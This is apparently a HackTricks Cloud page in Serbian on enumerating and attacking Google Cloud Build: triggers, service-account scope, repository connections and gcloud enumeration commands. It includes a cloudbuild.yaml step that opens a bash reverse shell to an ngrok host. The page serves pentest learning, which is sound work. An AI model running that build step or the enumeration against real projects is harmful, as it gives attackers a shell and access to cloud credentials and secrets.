# GCP - Cloud Build Enum

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

Google Cloud Build je upravljana CI/CD platforma koja **automatizuje procese izgradnje** i objavljivanja softvera, integrišući se sa **repozitorijumima izvornog koda** i podržavajući širok spektar programskih jezika. Omogućava programerima da **automatski izgrade, testiraju i implementiraju kod**, pružajući fleksibilnost za prilagođavanje koraka izgradnje i radnih tokova.

Svaki Cloud Build okidač je **povezan sa Cloud Repository-jem ili direktno povezan sa spoljnim repozitorijumom** (Github, Bitbucket i Gitlab).

{% hint style="success" %}
Nisam primetio način da ukradem Github/Bitbucket token odavde ili iz Cloud Repositories jer kada se repozitorijum preuzme, pristupa mu se putem [https://source.cloud.google.com/](https://source.cloud.google.com/) URL-a i Github se ne pristupa putem klijenta.
{% endhint %}

### Događaji

Cloud Build se može pokrenuti ako:

* **Pritisnete na granu**: Navedite granu
* **Pritisnete novi tag**: Navedite tag
* **Pull zahtev**: Navedite granu koja prima PR
* **Ručno pokretanje**
* **Pub/Sub poruka**: Navedite temu
* **Webhook događaj**: Izložiće HTTPS URL i zahtev mora biti autentifikovan sa tajnom

### Izvršavanje

Postoje 3 opcije:

* Yaml/json **koji specificira komande** za izvršavanje. Obično: `/cloudbuild.yaml`
* Samo jedna koja se može specificirati "inline" u web konzoli i u CLI
* Najčešća opcija
* Relevantna za neautentifikovan pristup
* **Dockerfile** za izgradnju
* **Buildpack** za izgradnju

### Dozvole SA

**Servisni nalog ima opseg `cloud-platform`**, tako da može **koristiti sve privilegije**. Ako **nije specificiran SA** (kao kada se vrši podnošenje), **podrazumevani SA** `<projektni-broj>@cloudbuild.gserviceaccount.com` će biti **korišćen**.

Podrazumevano nisu dodeljene nikakve dozvole, ali je prilično jednostavno dodeliti neke:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Odobrenja

Moguće je konfigurisati Cloud Build da **zahteva odobrenja za izvršavanje izgradnje** (isključeno je po podrazumevanim podešavanjima).

### Veze i Repozitorijumi

Veze se mogu kreirati preko:

* **GitHub-a**: Prikazaće OAuth prozor koji traži dozvole za **dobijanje Github tokena** koji će biti sačuvan unutar **Secret Manager-a**.
* **GitHub Enterprise-a**: Zatražiće instalaciju **GithubApp**-a. Kreiraće se i sačuvati **autentifikacioni token** sa vašeg GitHub Enterprise hosta u ovom projektu kao tajna u **Secret Manager-u**.
* **GitLab / Enterprise**: Morate pružiti pristupni token API-ju i pristupni token za čitanje API-ja koji će biti sačuvani u **Secret Manager-u**.

Kada se generiše veza, možete je koristiti da **povežete repozitorijume do kojih Github nalog ima pristup**.

Ova opcija je dostupna preko dugmeta:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Imajte na umu da su repozitorijumi povezani na ovaj način **dostupni samo u okidačima koji koriste 2. generaciju.**
{% endhint %}

### Poveži Repozitorijum

Ovo nije isto kao **`veza`**. Ovo omogućava **različite** načine za **pristup Github ili Bitbucket** repozitorijumu, ali **ne generiše objekat veze, već generiše objekat repozitorijuma (1. generacija).**

Ova opcija je dostupna preko dugmeta:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Skladištenje

Ponekad će Cloud Build **generisati novo skladište za čuvanje datoteka za okidač**. To se dešava na primer u primeru koji GCP nudi sa:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Kreiran je Storage bucket pod nazivom [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) za skladištenje `.tgz` datoteke sa fajlovima koji će biti korišćeni.

### Dobijanje shell-a
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Enumeracija

Možete pronaći **osetljive informacije u konfiguracijama izgradnje i zapisima**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Eskalacija privilegija

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Neautentifikovan pristup

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Post eksploatacija

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
